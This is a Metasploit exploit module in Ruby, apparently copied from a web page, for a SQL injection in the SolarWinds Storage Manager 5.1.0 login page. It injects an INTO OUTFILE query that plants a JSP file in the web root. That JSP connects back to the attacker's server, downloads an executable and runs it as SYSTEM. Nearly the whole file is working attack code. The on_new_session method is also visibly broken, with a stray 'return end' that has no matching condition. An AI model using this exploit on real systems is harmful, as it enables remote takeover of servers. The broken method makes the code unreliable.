# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::TcpServer
    include Msf::Exploit::EXE
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Solarwinds Storage Manager 5.1.0 SQL Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a SQL injection found in Solarwinds Storage Manager
                login interface.  It will send a malicious SQL query to create a JSP file
                under the web root directory, and then let it download and execute our malicious
                executable under the context of SYSTEM.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;r@b13$&#039;, # Original discovery by Digital Defense VRT
                    &#039;muts&#039;,   # PoC
                    &#039;sinn3r&#039;  # Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;EDB&#039;, &#039;18818&#039;],
                    [&#039;URL&#039;, &#039;http://ddilabs.blogspot.com/2012/02/solarwinds-storage-manager-server-sql.html&#039;],
                    [&#039;URL&#039;, &#039;http://www.solarwinds.com/documentation/storage/storagemanager/docs/ReleaseNotes/vulnerability.htm&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # Win XP / 2003 / Vista / Win 7 / etc
                    [&#039;Windows Universal&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Dec 7 2011",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptPort.new(&#039;RPORT&#039;, [true, &#039;The target port&#039;, 9000])
            ], self.class)
    end
 
 
    #
    # A very gentle check to see if Solarwinds Storage Manage exists or not
    #
    def check
        res = send_request_raw({
            &#039;method&#039; => &#039;GET&#039;,
            &#039;uri&#039;    => &#039;/LoginServlet&#039;
        })
 
        if res and res.body =~ /\<title>\SolarWinds \- Storage Manager\<\/title\>/ and
                   res.body =~ /\<img style="padding\-top:30px;" src="\/images\/logo_solarwinds_login\.png" width="163" height="70" alt="SolarWinds Storage Manager"\>/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
 
    #
    # Remove the JSP once we get a shell.
    # We cannot delete the executable because it will still be in use.
    #
    def on_new_session(cli)
            return
        end
 
        cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
 
        begin
            jsp = @outpath.gsub(/\//, "\\\\")
            jsp = jsp.gsub(/"/, "")
            vprint_status("#{rhost}:#{rport} - Deleting: #{jsp}")
            cli.fs.file.rm(jsp)
            print_status("#{rhost}:#{rport} - #{@jsp_name + &#039;.jsp&#039;} deleted")
        rescue ::Exception => e
            print_error("Unable to delete #{@jsp_name + &#039;.jsp&#039;}: #{e.message}")
        end
    end
 
 
    #
    # Transfer the malicious executable to our victim
    #
    def on_client_connect(cli)
        print_status("#{cli.peerhost}:#{cli.peerport} - Sending executable (#{@native_payload.length} bytes)")
        cli.put(@native_payload)
        service.close_client(cli)
    end
 
 
    #
    # Generate a download+exe JSP payload
    #
    def generate_jsp_payload
        my_host = (datastore[&#039;SRVHOST&#039;] == &#039;0.0.0.0&#039;) ? Rex::Socket.source_address("50.50.50.50") : datastore[&#039;SRVHOST&#039;]
        my_port = datastore[&#039;SRVPORT&#039;]
 
        # tmp folder = C:\Program Files\SolarWinds\Storage Manager Server\temp\
        # This will download our malicious executable in base64 format, decode it back,
        # save it as a temp file, and then finally execute it.
        jsp = %Q|
        <%@page import="java.io.*"%>
        <%@page import="java.net.*"%>
        <%@page import="sun.misc.BASE64Decoder"%>
 
        <%
        StringBuffer buf = new StringBuffer();
        byte[] shellcode = null;
        BufferedOutputStream outstream = null;
        try {
            Socket s = new Socket("#{my_host}", #{my_port});
            BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));
            while (buf.length() < #{@native_payload.length}) {
                buf.append( (char) r.read());
            }
 
            BASE64Decoder decoder = new BASE64Decoder();
            shellcode = decoder.decodeBuffer(buf.toString());
 
            File temp = File.createTempFile("#{@native_payload_name}", ".exe");
            String path = temp.getAbsolutePath();
 
            outstream = new BufferedOutputStream(new FileOutputStream(path));
            outstream.write(shellcode);
            outstream.close();
 
            Process p = Runtime.getRuntime().exec(path);
        } catch (Exception e) {}
        %>
        |
 
        jsp = jsp.gsub(/\n/, &#039;&#039;)
        jsp = jsp.gsub(/\t/, &#039;&#039;)
 
        jsp.unpack("H*")[0]
    end
 
 
    #
    # Run the actual exploit
    #
    def inject_exec
        # This little lag is meant to ensure the TCP server runs first before the requests
        select(nil, nil, nil, 1)
 
        # Inject our JSP payload
        print_status("#{rhost}:#{rport} - Sending JSP payload")
        pass = rand_text_alpha(rand(10)+5)
        hex_jsp  = generate_jsp_payload
 
        res = send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => &#039;/LoginServlet&#039;,
            &#039;headers&#039;   => {
                &#039;Accept-Encoding&#039; => &#039;identity&#039;
            },
            &#039;vars_post&#039;  => {
                &#039;loginState&#039; => &#039;checkLogin&#039;,
                &#039;password&#039;   => pass,
                &#039;loginName&#039;  => "AAA&#039; union select 0x#{hex_jsp},2,3,4,5,6,7,8,9,10,11,12,13,14 into outfile #{@outpath}#"
            }
        })
 
        # Pick up the cookie, example:
        # JSESSIONID=D90AC5C0BB43B5AC1396736214A1B5EB
        if res and res.headers[&#039;Set-Cookie&#039;] =~ /JSESSIONID=(\w+);/
            cookie = "JSESSIONID=#{$1}"
        else
            print_error("Unable to get a session ID")
            return
        end
 
        # Trigger the JSP
        print_status("#{rhost}:#{rport} - Trigger JSP payload")
        send_request_cgi({
            &#039;method&#039;    => &#039;POST&#039;,
            &#039;uri&#039;       => &#039;/LoginServlet&#039;,
            &#039;headers&#039;   => {
                &#039;Cookie&#039; => cookie,
                &#039;Accept-Encoding&#039; => &#039;identity&#039;
            },
            &#039;vars_post&#039; => {
                &#039;loginState&#039; => &#039;checkLogin&#039;,
                &#039;password&#039;   => pass,
                &#039;loginName&#039;  => "1&#039; or 1=1#--"
            }
        })
 
        res = send_request_raw({
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => "/#{@jsp_name + &#039;.jsp&#039;}",
            &#039;headers&#039; => {
                &#039;Cookie&#039; => cookie
            }
        })
 
        handler
    end
 
 
    #
    # The server must start first, and then we send the malicious requests
    #
    def exploit
        # Avoid passing this as an argument for performance reasons
        # This is in base64 is make sure our file isn&#039;t mangled
        @native_payload      = [generate_payload_exe].pack("m*")
        @native_payload_name = rand_text_alpha(rand(6)+3)
        @jsp_name            = rand_text_alpha(rand(6)+3)
        @outpath             = "\"C:/Program Files/SolarWinds/Storage Manager Server/webapps/ROOT/#{@jsp_name + &#039;.jsp&#039;}\""
 
        begin
            t = framework.threads.spawn("reqs", false) { inject_exec }
            print_status("Serving executable on #{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}")
            super
        ensure
            t.kill
        end
    end
end



